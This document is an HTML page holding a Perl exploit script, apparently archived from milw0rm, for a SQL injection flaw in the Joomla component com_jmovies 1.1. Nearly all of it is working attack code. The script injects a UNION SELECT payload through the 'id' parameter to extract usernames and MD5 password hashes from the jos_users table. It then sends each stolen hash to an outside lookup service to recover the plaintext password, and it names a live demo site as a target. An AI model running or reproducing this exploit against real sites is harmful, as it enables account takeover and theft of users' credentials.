<html><head><title>Joomla Component com_jmovies 1.1 (id) SQL Injection Exploit</title></head><pre>#!/usr/bin/perl -w
# -----------------------------------------------------------
# Joomla Component com_jmovies 1.1 (id) SQL Injection Exploit
# by s3rg3770 with athos :)
# demo http://www.disneyrama.com
# -----------------------------------------------------------
# Note: In lulz we trust :O
# -----------------------------------------------------------

use strict;
use LWP::UserAgent;
use LWP::Simple;


my $host = shift;
my $myid = shift or &amp;help;

my $path = &quot;/index.php?option=com_jmovies&amp;Itemid=29&amp;task=detail&amp;id=-1+&quot;.
           &quot;union+select+1,concat(0x215F,username,0x3a,password,0x215F)+&quot;.
           &quot;from+jos_users+where+id=${myid}--&quot;;

my $http = new LWP::UserAgent(
                               agent   =&gt; 'Mozilla/4.5 [en] (Win95; U)',
                               timeout =&gt; '5',
                             );  


my $response = $http-&gt;get($host.$path); 

if($response-&gt;content =~ /!_(.+?)!_/i)
{
     print STDOUT &quot;Hash MD5: $1\n&quot;;
     print STDOUT &quot;Password: &quot;.search_md5($1).&quot;\n&quot;;
     exit;
}
else
{
     print STDOUT &quot;Exploit Failed!\n&quot;;
     exit;
}



sub search_md5
{
     my $hash = shift @_;
     my $cont = undef;

     $cont = get('http://md5.rednoize.com/?p&amp;s=md5&amp;q='.$hash);
        
     if(length($hash) &lt; 32 &amp;&amp; !is_error($cont))
     {
          return $cont;
     }
}   


sub help
{
     print STDOUT &quot;Usage: perl $0 [host] [user ID]\n&quot;;
     print STDOUT &quot;by athos - staker[at]hotmail[dot]it\n&quot;;
     exit;
}

# milw0rm.com [2008-12-03]</pre></html>